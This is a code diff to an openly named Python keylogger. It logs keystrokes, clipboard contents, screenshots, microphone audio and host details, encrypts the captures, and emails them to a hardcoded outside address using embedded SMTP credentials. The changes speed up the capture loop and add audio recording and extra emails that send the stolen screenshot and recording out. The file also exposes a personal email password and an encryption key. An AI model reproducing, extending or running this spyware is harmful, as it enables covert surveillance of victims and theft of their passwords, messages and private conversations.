@@ -30,6 +30,7 @@ from PIL import ImageGrab
 keys_information = "key_log.txt"
 system_information = "system_information.txt"
 clipboard_information = "clipboard_information.txt"
+
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 
@@ -38,8 +39,8 @@ clipboard_information_e = "e_clipboard_information.txt"
 keys_information_e = "e_keys_information.txt"
 
 microphone_time = 10
-time_iteration = 15
-number_of_iterations_end = 3
+time_iteration = 5
+number_of_iterations_end = 2
 
 email_address = "romanrtera@gmail.com"
 password = "wjrx pxld iyqu lvec"
@@ -51,19 +52,19 @@ to_addr = "boglarka_m@yahoo.com"
 key = "1EOZBnHLTFjU6qovA2eO_jckUR0NNGCg3Dq4Oys2WvA="
 
 # file_path = "D:\\keylog\\Keylogger\\Project"
-file_path = "C:\\Users\\BOGI\\Desktop\\Keylogger"
+file_path = "C:\\Users\\BOGI\\Desktop\\Keylogger\\keylogger\\Project"
 extend = "\\"
 file_merge = file_path + extend
 
 
 # email controls
-def send_email(filename, attachment, to_addr):
+def send_email(filename, attachment, subject, body):
     from_addr = email_address
     msg = MIMEMultipart()
     msg['From'] = from_addr
     msg['To'] = to_addr
-    msg['Subject'] = 'Log File'
-    body = 'Body_of_the_mail'
+    msg['Subject'] = subject
+    body = body
     msg.attach(MIMEText(body, 'plain'))
     filename = filename
     attachment = open(attachment, "rb")
@@ -80,11 +81,11 @@ def send_email(filename, attachment, to_addr):
     s.quit()
 
 
-# send_email(keys_information, file_path + extend + keys_information, to_addr)
+# send_email(keys_information, file_merge + keys_information, to_addr)
 
 # get computer information
 def computer_information():
-    with open(file_path + extend + system_information, "a") as f:
+    with open(file_merge + system_information, "a") as f:
         hostname = socket.gethostname()
         ip_addr = socket.gethostbyname(hostname)
         try:
@@ -104,7 +105,7 @@ computer_information()
 
 # get the clipboard contents
 def copy_clipboard():
-    with open(file_path + extend + clipboard_information, "a") as f:
+    with open(file_merge + clipboard_information, "a") as f:
         try:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
@@ -126,13 +127,13 @@ def microphone():
 
     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
     sd.wait()
-    write(file_path + extend + audio_information, fs, myrecording)
+    write(file_merge + audio_information, fs, myrecording)
 
 
 # get screenshot
 def screenshot():
     im = ImageGrab.grab()
-    im.save(file_path + extend + screenshot_information)
+    im.save(file_merge + screenshot_information)
 
 
 screenshot()
@@ -161,7 +162,7 @@ while number_of_iterations < number_of_iterations_end:
 
 
     def write_file(keys):
-        with open(file_path + extend + keys_information, "a") as f:
+        with open(file_merge + keys_information, "a") as f:
             for key in keys:
                 k = str(key).replace("'", "")
                 if k.find("space") > 0:
@@ -182,11 +183,16 @@ while number_of_iterations < number_of_iterations_end:
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-    if currentTime > stoppingTime:
-        with open(file_path + extend + keys_information, "w") as f:
+    if time.time() > stoppingTime:
+        with open(file_merge + keys_information, "w") as f:
             f.write("")
         screenshot()
-        send_email(screenshot_information, file_path + extend + screenshot_information, to_addr)
+        microphone()
+        send_email(screenshot_information, file_merge + screenshot_information, "Screenshot", "Attached is a "
+                                                                                              "screenshot captured by"
+                                                                                              " the keylogger.")
+        send_email(audio_information, file_merge + audio_information, "Audio", "Attached is an audio recording "
+                                                                               "captured by the keylogger.")
         copy_clipboard()
         number_of_iterations += 1
 
@@ -208,7 +214,12 @@ for encrypting_file in files_to_encrypt:
     with open(encrypted_file_names[count], "wb") as f:
         f.write(encrypted)
 
-    send_email(encrypted_file_names[count], encrypted_file_names[count], to_addr)
+    send_email(encrypted_file_names[count], encrypted_file_names[count], "Encrypted Files", "Attached are encrypted "
+                                                                                            "files containing system "
+                                                                                            "information, "
+                                                                                            "clipboard content, "
+                                                                                            "and keystrokes captured "
+                                                                                            "by the keylogger.")
 
     count += 1
 
